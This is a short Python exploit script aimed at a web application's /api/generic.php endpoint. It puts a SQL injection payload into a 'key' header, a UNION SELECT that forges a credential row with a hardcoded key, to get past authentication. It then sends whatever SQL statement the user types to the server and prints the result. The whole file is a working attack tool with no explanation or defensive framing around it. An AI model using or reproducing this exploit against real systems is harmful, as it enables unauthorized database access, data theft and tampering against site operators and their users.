import requests
u = input("Enter your url:")
url =u+"/api/generic.php"

header = {
    "key":"""1'union select 1,'Default','gbmZ48tzyLfx8PqapQB3el8nGFPqQldS',NULL,1,0,1#"""
}
sql= input("Enter the sql statement you want to execute:")
data ={
    "sql":sql
}
res =requests.post(url=url,headers=header,data=data)
print(res.text)
